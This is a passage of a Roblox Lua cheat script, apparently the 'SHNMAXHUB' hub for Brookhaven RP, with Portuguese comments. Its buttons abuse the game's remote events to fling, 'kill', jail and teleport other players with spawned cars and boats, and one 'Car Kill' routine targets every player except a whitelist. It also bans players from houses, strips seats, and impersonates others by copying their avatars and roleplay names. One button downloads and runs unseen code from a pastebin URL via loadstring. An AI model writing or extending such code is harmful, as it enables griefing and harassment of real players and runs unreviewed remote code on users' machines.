    local OldPos = RootPart.CFrame -- Guardar a posição original do jogador

    if not Target and Humanoid then return end

    -- Verificar e spawnar o carro se necessário
    local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
    if not PCar then
        if RootPart and Target then
            RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61) -- Teleporte inicial
            task.wait(0.5)
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "CopUnderCoverSUV")
            task.wait(0.5)
            PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            task.wait(0.5)
            local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
            if Seat then
                repeat 
                    task.wait()
                    RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                until Humanoid.Sit
            end
        end
    end

    -- Repetir processo se o carro já foi criado
    task.wait(0.5)
    PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
    if PCar and not Humanoid.Sit then
        local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
        if Seat then
            repeat 
                task.wait()
                RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
            until Humanoid.Sit
        end
    end

    -- Encontrar o alvo
    local Target = game.Players:FindFirstChild(getgenv().Target)
    local TargetC = Target and Target.Character
    local TargetH = TargetC and TargetC:FindFirstChildOfClass("Humanoid")
    local TargetRP = TargetC and TargetC:FindFirstChild("HumanoidRootPart")

    -- Teletransportar e fazer o "kill" no alvo
    if TargetC and TargetH and TargetRP then
        if not TargetH.Sit then
            while not TargetH.Sit do
                task.wait()

                -- Gera rotações aleatórias
                local randomX = math.random(-360, 360)
                local randomY = math.random(-360, 360)
                local randomZ = math.random(-360, 360)

                local kill = function(alvo, pos, angulo)
                    PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                end

                -- Movimentos do carro ao redor do alvo com rotações aleatórias
                kill(TargetRP, CFrame.new(0, 1, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                kill(TargetRP, CFrame.new(0, -2.25, 5) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                kill(TargetRP, CFrame.new(0, 2.25, 0.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                kill(TargetRP, CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                kill(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                kill(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
            end

            -- Quando o alvo sentar, teleportar de volta para a posição antiga
            task.wait(0.1)
            PCar:SetPrimaryPartCFrame(OldPos) -- Aqui o carro vai para a sua posição antiga (OldPos)
            task.wait(0.2)
            Humanoid.Sit = false
            task.wait(0.1)

            -- Executar a função DeleteAllVehicles após 0.5 segundos
            task.wait(0.1)
            local args = {
                [1] = "DeleteAllVehicles"
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
        end
    end
end

-- Adicionando o botão
Tab4:AddButton({
    Name = "Car - Bring",
    Callback = function()
        bringPlayer()
    end
})

local Section = Tab4:AddSection({"<Combate Em Geral-"})

Tab4:AddButton({
    Name = "Fling Boat - All",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart.CFrame
        local Angles = 0
        local PCar = Vehicles:FindFirstChild(Player.Name.."Car")

        -- Se não tiver um carro, cria um
        if not PCar then
            if RootPart then
                RootPart.CFrame = CFrame.new(1754, -2, 58)
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
                task.wait(0.5)
                PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                task.wait(0.5)
                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat
                        task.wait()
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end
        end

        task.wait(0.5)
        PCar = Vehicles:FindFirstChild(Player.Name.."Car")

        -- Se o carro existir, teletransporta para o assento se necessário
        if PCar then
            if not Humanoid.Sit then
                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat
                        task.wait()
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end
        end

        -- Adiciona o BodyGyro ao carro para controle de movimento
        local SpinGyro = Instance.new("BodyGyro")
        SpinGyro.Parent = PCar.PrimaryPart
        SpinGyro.MaxTorque = Vector3.new(1e7, 1e7, 1e7)
        SpinGyro.P = 1e7
        SpinGyro.CFrame = PCar.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(90), 0)

        -- Função de Fling em cada jogador por 3 segundos
        local function flingPlayer(TargetC, TargetRP, TargetH)
            Angles = 0
            local endTime = tick() + 1  -- Define o tempo final em 2 segundos a partir de agora
            while tick() < endTime do
                Angles = Angles + 100
                task.wait()

                -- Movimentos e ângulos para o Fling
                local kill = function(alvo, pos, angulo)
                    PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                end

                -- Fling para várias posições ao redor do TargetRP
                kill(TargetRP, CFrame.new(0, 3, 0), CFrame.Angles(math.rad(Angles), 0, 0))
                kill(TargetRP, CFrame.new(0, -1.5, 2), CFrame.Angles(math.rad(Angles), 0, 0))
                kill(TargetRP, CFrame.new(2, 1.5, 2.25), CFrame.Angles(math.rad(50), 0, 0))
                kill(TargetRP, CFrame.new(-2.25, -1.5, 2.25), CFrame.Angles(math.rad(30), 0, 0))
                kill(TargetRP, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))
                kill(TargetRP, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))
            end
        end

        -- Itera sobre todos os jogadores
        for _, Target in pairs(game.Players:GetPlayers()) do
            -- Pula o jogador local
            if Target ~= Player then
                local TargetC = Target.Character
                local TargetH = TargetC and TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC and TargetC:FindFirstChild("HumanoidRootPart")

                -- Se encontrar o alvo e seus componentes, executa o fling
                if TargetC and TargetH and TargetRP then
                    flingPlayer(TargetC, TargetRP, TargetH)  -- Fling no jogador atual
                end
            end
        end

        -- Retorna o jogador para sua posição original
        task.wait(0.5)
        PCar:SetPrimaryPartCFrame(CFrame.new(0, 0, 0))
        task.wait(0.5)
        Humanoid.Sit = false
        task.wait(0.5)
        RootPart.CFrame = OldPos

        -- Remove o BodyGyro após o efeito
        SpinGyro:Destroy()
    end
})

Tab4:AddButton({
  Name = "Fling Couch - All",
  Callback = function()
    loadstring(game:HttpGet('https://pastebin.com/raw/CnC2v1Sa'))()
  end
})

Tab4:AddButton({
    Name = "Car Kill - All",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart.CFrame

        if not Humanoid or not RootPart then return end

        -- Lista de proteção
        local ProtectedList = {
            [7870544119] = true,
            [7680301371] = true,
            [3845424860] = true,
            [7991200153] = true,
            [7685128251] = true,
            [7118994826] = true,
            [7905238071] = true,
            [2803402717] = true,
            [3396788926] = true,
            [4863206819] = true,
            [1549110910] = true,
            [4854018750] = true,
            [807242034] = true,
            [4432430525] = true,
        }

        local PlayersList = {} -- Lista de jogadores a serem processados
        for _, p in pairs(game.Players:GetPlayers()) do
            if p ~= Player and not ProtectedList[p.UserId] then
                table.insert(PlayersList, p)
            end
        end

        local function ProcessPlayer(TargetPlayer)
            local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            if not PCar then
                RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
                task.wait(0.5)
                PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
                local Seat = PCar and PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat
                        task.wait()
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end

            local TargetC = TargetPlayer.Character
            if TargetC then
                local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
                if TargetH and TargetRP then
                    while not TargetH.Sit do
                        task.wait()

                        -- Rotação aleatória ao redor do jogador
                        local randomX = math.random(-1000, 1000)
                        local randomY = math.random(-1000, 1000)
                        local randomZ = math.random(-1000, 1000)

                        -- Função para movimentar o carro
                        local moveCar = function(alvo, offset, rotation)
                            local newPosition = alvo.Position + offset
                            local newCFrame = CFrame.new(newPosition) * rotation
                            PCar:SetPrimaryPartCFrame(newCFrame)
                        end

                        -- Movimentos do carro ao redor do jogador alvo
                        moveCar(TargetRP, Vector3.new(0, 1, 0), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, -2.25, 5), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, 2.25, 0.25), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                    end

                    -- Teleporte para a coordenada final
                    task.wait(0.1)
                    PCar:SetPrimaryPartCFrame(CFrame.new(0, -600, 0))

                    -- Espera e apaga o carro
                    task.wait(0.6)
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
                    task.wait(0.2)
                    Humanoid.Sit = false
                    RootPart.CFrame = OldPos
                end
            end
        end

        -- Processa cada jogador da lista
        for _, TargetPlayer in ipairs(PlayersList) do
            ProcessPlayer(TargetPlayer)
        end
    end
})

Tab4:AddButton({
    Name = "House Kill - All",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Backpack = Player.Backpack
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Houses = game.Workspace:FindFirstChild("001_Lots")
        local Vehicles = Workspace.Vehicles

        -- Lista de IDs na whitelist
        local Whitelist = {
            7870544119,
            7680301371,
            3845424860,
            7991200153,
            7685128251,
            7118994826,
            7905238071,
            2803402717,
            3396788926,
            4863206819,
            1549110910,
            4854018750,
            807242034,
            4432430525,
        }

        function Check()
            return Player and Character and Humanoid and RootPart and Vehicles
        end

        local function SpawnCar()
            if Check() then
                local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                if not PCar then
                    RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                    task.wait(0.5)
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
                    task.wait(0.5)
                    PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                    task.wait(0.5)
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                    if Seat then
                        repeat task.wait()
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                        until Humanoid.Sit
                    end
                end
            end
        end

        if Check() then
            local House = Houses:FindFirstChild(Player.Name.."House")
            if not House then
                local EHouse
                for _, Lot in pairs(Houses:GetChildren()) do
                    if Lot.Name == "For Sale" then
                        for _, num in pairs(Lot:GetDescendants()) do
                            if num:IsA("NumberValue") and num.Name == "Number" and num.Value < 25 and num.Value > 10 then
                                EHouse = Lot
                                break
                            end
                        end
                    end
                end

                local BuyDetector = EHouse:FindFirstChild("BuyHouse")
                if BuyDetector and BuyDetector:IsA("BasePart") then
                    RootPart.CFrame = BuyDetector.CFrame + Vector3.new(0, -6, 0)
                    task.wait(.5)
                    local ClickDetector = BuyDetector:FindFirstChild("ClickDetector")
                    if ClickDetector then
                        fireclickdetector(ClickDetector)
                    end
                end
            end

            task.wait(0.5)
            local PreHouse = Houses:FindFirstChild(Player.Name .. "House")
            if PreHouse then
                task.wait(0.5)
                local Number
                for i, x in pairs(PreHouse:GetDescendants()) do
                    if x.Name == "Number" and x:IsA("NumberValue") then
                        Number = x
                    end
                end
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse", "052_House", Number.Value)
            end

            for _, Target in pairs(game.Players:GetPlayers()) do
                if Target ~= Player and Target.Character then
                    -- Verifica se o ID do jogador está na whitelist
                    if not table.find(Whitelist, Target.UserId) then
                        local TargetC = Target.Character
                        local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
                        local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
                        if TargetH and TargetRP then
                            SpawnCar()

                            if not TargetH.Sit then
                                while not TargetH.Sit do
                                    task.wait()
                                    local Fling = function(alvo, pos, angulo)
                                        local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                                        if PCar then
                                            PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                                        end
                                    end
                                    local randomAngle = math.random(-1000, 1000)
                                    Fling(TargetRP, CFrame.new(0, 1, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(randomAngle), 0, 0))
                                    Fling(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(randomAngle), 0, 0))
                                    Fling(TargetRP, CFrame.new(2.25, 1.5, -2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(randomAngle), 0, 0))
                                    Fling(TargetRP, CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(randomAngle), 0, 0))
                                end

                                task.wait(0.2)
                                local House = Houses:FindFirstChild(Player.Name.."House")
                                local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                                if PCar then
                                    PCar:SetPrimaryPartCFrame(CFrame.new(House.HouseSpawnPosition.Position))
                                end
                                task.wait(0.2)
                                local pedro = Region3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(30, 30, 30), game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(30, 30, 30))

                                local a = workspace:FindPartsInRegion3(pedro, game.Players.LocalPlayer.Character.HumanoidRootPart, math.huge)

                                for i, v in pairs(a) do
                                    if v.Name == "HumanoidRootPart" then
                                        local b = game:GetService("Players"):FindFirstChild(v.Parent.Name)
                                        local args = {
                                            [1] = "BanPlayerFromHouse",
                                            [2] = b,
                                            [3] = v.Parent
                                        }

                                        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))

                                        local args = {
                                            [1] = "DeleteAllVehicles"
                                        }
                                        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
                                    end
                                end
                            end
                        end
                    end
                end
                task.wait(0.2)
            end
        end
    end
})

Tab4:AddButton({
    Name = "Car Jail - All",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart and RootPart.CFrame or nil

        if not Humanoid or not RootPart or not Vehicles then return end

        -- Lista de proteção (Whitelist)
        local ProtectedList = {
            [7870544119] = true,
            [7680301371] = true,
            [3845424860] = true,
            [7991200153] = true,
            [7685128251] = true,
            [7118994826] = true,
            [7905238071] = true,
            [2803402717] = true,
            [3396788926] = true,
            [4863206819] = true,
            [1549110910] = true,
            [4854018750] = true,
            [807242034] = true,
            [4432430525] = true,
        }

        local PlayersList = {} -- Lista de jogadores a serem processados
        for _, p in pairs(game.Players:GetPlayers()) do
            if p ~= Player and not ProtectedList[p.UserId] then
                table.insert(PlayersList, p)
            end
        end

        local function ProcessPlayer(TargetPlayer)
            local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            if not PCar then
                -- Move jogador para a coordenada inicial
                RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
                task.wait(0.5)
                PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            end

            local Seat = PCar and PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
            if Seat then
                repeat
                    task.wait()
                    RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                until Humanoid.Sit
            end

            local TargetC = TargetPlayer.Character
            if TargetC then
                local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
                if TargetH and TargetRP then
                    while not TargetH.Sit do
                        task.wait()

                        -- Rotação aleatória ao redor do jogador
                        local randomX = math.random(-360, 360)
                        local randomY = math.random(-360, 360)
                        local randomZ = math.random(-360, 360)

                        -- Função para movimentar o carro
                        local function moveCar(alvo, offset, rotation)
                            local newPosition = alvo.Position + offset
                            local newCFrame = CFrame.new(newPosition) * rotation
                            PCar:SetPrimaryPartCFrame(newCFrame)
                        end

                        -- Movimentos do carro ao redor do jogador alvo
                        moveCar(TargetRP, Vector3.new(0, 1, 0), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, -2.25, 5), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, 2.25, 0.25), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                    end

                    -- Teleporte para a coordenada final
                    task.wait(0.1)
                    PCar:SetPrimaryPartCFrame(CFrame.new(1, 73, -488))

                    -- Espera e apaga o carro
                    task.wait(0.6)
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
                    task.wait(0.2)
                    Humanoid.Sit = false
                    if OldPos then
                        RootPart.CFrame = OldPos
                    end
                end
            end
        end

        -- Processa cada jogador da lista
        for _, TargetPlayer in ipairs(PlayersList) do
            ProcessPlayer(TargetPlayer)
        end
    end
})

Tab4:AddButton({
    Name = "Car Bring - All",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart.CFrame  -- Armazenar a posição original do jogador

        if not Humanoid or not RootPart then return end

        -- Lista de proteção com novos IDs
        local ProtectedList = {
            [7870544119] = true,
            [7680301371] = true,
            [3845424860] = true,
            [7991200153] = true,
            [7685128251] = true,
            [7118994826] = true,
            [7905238071] = true,
            [2803402717] = true,
            [3396788926] = true,
            [4863206819] = true,
            [1549110910] = true,
            [4854018750] = true,
            [807242034] = true,
            [4432430525] = true,
        }

        local PlayersList = {} -- Lista de jogadores a serem processados
        for _, p in pairs(game.Players:GetPlayers()) do
            if p ~= Player and not ProtectedList[p.UserId] then
                table.insert(PlayersList, p)
            end
        end

        local function ProcessPlayer(TargetPlayer)
            local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            if not PCar then
                -- Teletransporta o jogador para uma posição inicial antes de pegar o carro
                RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
                task.wait(0.5)
                PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
                local Seat = PCar and PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat
                        task.wait()
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end

            local TargetC = TargetPlayer.Character
            if TargetC then
                local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
                if TargetH and TargetRP then
                    while not TargetH.Sit do
                        task.wait()

                        -- Rotação aleatória ao redor do jogador
                        local randomX = math.random(-360, 360)
                        local randomY = math.random(-360, 360)
                        local randomZ = math.random(-360, 360)

                        -- Função para movimentar o carro
                        local moveCar = function(alvo, offset, rotation)
                            local newPosition = alvo.Position + offset
                            local newCFrame = CFrame.new(newPosition) * rotation
                            PCar:SetPrimaryPartCFrame(newCFrame)
                        end

                        -- Movimentos do carro ao redor do jogador alvo
                        moveCar(TargetRP, Vector3.new(0, 1, 0), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, -2.25, 5), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, 2.25, 0.25), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                    end

                    -- Teleporte para a posição original
                    task.wait(0.1)
                    PCar:SetPrimaryPartCFrame(OldPos)  -- Usando a posição original do jogador

                    -- Espera e apaga o carro
                    task.wait(0.6)
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
                    task.wait(0.2)
                    Humanoid.Sit = false
                    RootPart.CFrame = OldPos  -- Retorna para a posição original do jogador
                end
            end
        end

        -- Processa cada jogador da lista
        for _, TargetPlayer in ipairs(PlayersList) do
            ProcessPlayer(TargetPlayer)
        end
    end
})

local Section = Tab4:AddSection({"<Outros-"})

Tab4:AddToggle({
    Name = "AntSit",
    Default = false,
    Callback = function(Value)
        disableSeats(Value)
    end
})

local newSeatConnection

function disableSeats(state)
    if state then
        -- Percorre todos os assentos e impede que sejam usados
        for _, seat in pairs(workspace:GetDescendants()) do
            if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
                if seat.Occupant then
                    seat.Occupant:Sit(nil) -- Expulsa qualquer jogador sentado
                end
                seat.Parent = nil -- Remove o assento temporariamente
            end
        end

        -- Conecta um evento para impedir novos assentos de serem usados
        newSeatConnection = workspace.DescendantAdded:Connect(function(descendant)
            if descendant:IsA("Seat") or descendant:IsA("VehicleSeat") then
                task.wait(0.1) -- Pequeno atraso para evitar erros
                descendant.Parent = nil
            end
        end)
    else
        -- Reativa todos os assentos movendo-os de volta para o workspace
        for _, seat in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
            if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
                seat.Parent = workspace
            end
        end

        -- Desconecta o evento de novos assentos
        if newSeatConnection then
            newSeatConnection:Disconnect()
            newSeatConnection = nil
        end
    end
end

local PlayerAddedConnection
local PlayerRemovingConnection

Tab4:AddToggle({
  Name = "Notificação De Entradas E Saidas",
  Default = false,
  Callback = function(Value)
    -- ID do som
    local soundId = "rbxassetid://5914602124"
    
    -- Verifica se o Toggle foi ativado
    if Value then
      -- Conecta a função de notificação quando um jogador entrar
      PlayerAddedConnection = game.Players.PlayerAdded:Connect(function(player)
        local Notify = Library:MakeNotify({
          Title = "SHNMAXHUB BROOKHAVEN RP 🏡",
          Text = player.Name .. " entrou no jogo",
          Time = 5
        })
        -- Tocar som quando a notificação de entrada for exibida
        local sound = Instance.new("Sound")
        sound.SoundId = soundId
        sound.Parent = game.Workspace
        sound:Play()
      end)

      -- Conecta a função de notificação quando um jogador sair
      PlayerRemovingConnection = game.Players.PlayerRemoving:Connect(function(player)
        local Notify = Library:MakeNotify({
          Title = "SHNMAXHUB BROOKHAVEN RP 🏡",
          Text = player.Name .. " saiu do jogo",
          Time = 5
        })
        -- Tocar som quando a notificação de saída for exibida
        local sound = Instance.new("Sound")
        sound.SoundId = soundId
        sound.Parent = game.Workspace
        sound:Play()
      end)
    else
      -- Desconecta as funções quando o Toggle for desmarcado
      if PlayerAddedConnection then
        PlayerAddedConnection:Disconnect()
      end
      if PlayerRemovingConnection then
        PlayerRemovingConnection:Disconnect()
      end
    end
  end
})

local Tab5 = Window:MakeTab({Name = "Avatar", Icon = "rbxassetid://10734952036"})

local Paragraph = Tab5:AddParagraph({"Avatar", "Copy Avatar Players"})

local Players = game:GetService("Players")
local Target = nil

-- Função para obter os nomes dos jogadores
local function GetPlayerNames()
    local PlayerNames = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(PlayerNames, player.Name)
    end
    return PlayerNames
end

-- Atualizando o Dropdown quando um jogador entra ou sai
local function UpdateDropdown()
    Dropdown:Refresh(GetPlayerNames(), true)
end

-- Conectando os eventos de jogador entrar e sair
Players.PlayerAdded:Connect(UpdateDropdown)
Players.PlayerRemoving:Connect(UpdateDropdown)

-- Adicionando o Dropdown com os nomes dos jogadores
local Dropdown = Tab5:AddDropdown({
    Name = "Selecionar Jogador Para a Cópia",
    Options = GetPlayerNames(),
    Default = Target,
    Callback = function(Value)
        Target = Value
    end
})

-- Adicionando o botão para copiar o avatar e animações
Tab5:AddButton({
    Name = "Copy Avatar",
    Callback = function()
        if not Target then return end

        local Player = Players:FindFirstChild(Target)
        if Player and Player.Character then
            local Character = Player.Character
            local Humanoid = Character:FindFirstChildOfClass("Humanoid")

            if Humanoid then
                local PDesc = Humanoid:GetAppliedDescription()
                local LPDesc = game.Players.LocalPlayer.Character.Humanoid:GetAppliedDescription()
                local RE = game:GetService("ReplicatedStorage").RE

                -- Copiando acessórios
                for _, v in ipairs(LPDesc:GetAccessories(true)) do
                    if v.AssetId then
                        task.wait(0.3)
                        RE:FindFirstChild("1Updat1eAvata1r"):FireServer("wear", tonumber(v.AssetId))
                    end
                end

                task.wait(0.1)
                RE:FindFirstChild("1Updat1eAvata1r"):FireServer("wear", tonumber(PDesc.Shirt))
                task.wait(0.5)
                RE:FindFirstChild("1Updat1eAvata1r"):FireServer("wear", tonumber(PDesc.Pants))

                task.wait(0.5)
                RE:FindFirstChild("1Avata1rOrigina1l"):FireServer("CharacterChange", {
                    PDesc.Torso, PDesc.RightArm, PDesc.LeftArm,
                    PDesc.RightLeg, PDesc.LeftLeg, PDesc.Head
                }, "By Davi999(Melhor Sub Dono)")

                task.wait(0.5)
                RE:FindFirstChild("1Updat1eAvata1r"):FireServer("wear", tonumber(PDesc.Face))

                -- Copiando acessórios do personagem
                for _, v in ipairs(PDesc:GetAccessories(true)) do
                    if v.AssetId then
                        task.wait(0.3)
                        RE:FindFirstChild("1Updat1eAvata1r"):FireServer("wear", tonumber(v.AssetId))
                    end
                end

                -- Copiando cor da pele
                local SkinColor = Character:FindFirstChild("Body Colors")
                if SkinColor then
                    task.wait(0.5)
                    RE:FindFirstChild("1Updat1eAvata1r"):FireServer("skintone", tostring(SkinColor.HeadColor))
                end

                task.wait(0.5)
                RE:FindFirstChild("1Updat1eAvata1r"):FireServer("wearWalkStyle", tonumber(PDesc.IdleAnimation))

                -- Copiando animações de movimento
                if Humanoid:FindFirstChild("Running") then
                    task.wait(0.5)
                    RE:FindFirstChild("1Updat1eAvata1r"):FireServer("wearWalkStyle", tonumber(Humanoid.Running))
                end

                if Humanoid:FindFirstChild("Jumping") then
                    task.wait(0.5)
                    RE:FindFirstChild("1Updat1eAvata1r"):FireServer("wearJumpStyle", tonumber(Humanoid.Jumping))
                end

                if Humanoid:FindFirstChild("Falling") then
                    task.wait(0.5)
                    RE:FindFirstChild("1Updat1eAvata1r"):FireServer("wearFallStyle", tonumber(Humanoid.Falling))
                end

                -- Copiando RPName e RPBio do jogador, se existirem
                local Bag = Player:FindFirstChild("PlayersBag")
                if Bag then
                    if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
                        task.wait(0.5)
                        RE:FindFirstChild("1RPNam1eTex1t"):FireServer("RolePlayName", Bag.RPName.Value)
                    end
                    if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
                        task.wait(0.5)
                        RE:FindFirstChild("1RPNam1eTex1t"):FireServer("RolePlayBio", Bag.RPBio.Value)
                    end
                    if Bag:FindFirstChild("RPNameColor") and Bag.RPNameColor.Value ~= Color3.fromRGB(255, 255, 255) then
                        task.wait(0.5)
                        RE:FindFirstChild("1RPNam1eColo1r"):FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
                    end
                    if Bag:FindFirstChild("RPBioColor") and Bag.RPBioColor.Value ~= Color3.fromRGB(255, 255, 255) then
                        task.wait(0.5)
                        RE:FindFirstChild("1RPNam1eColo1r"):FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
                    end
                end
            end
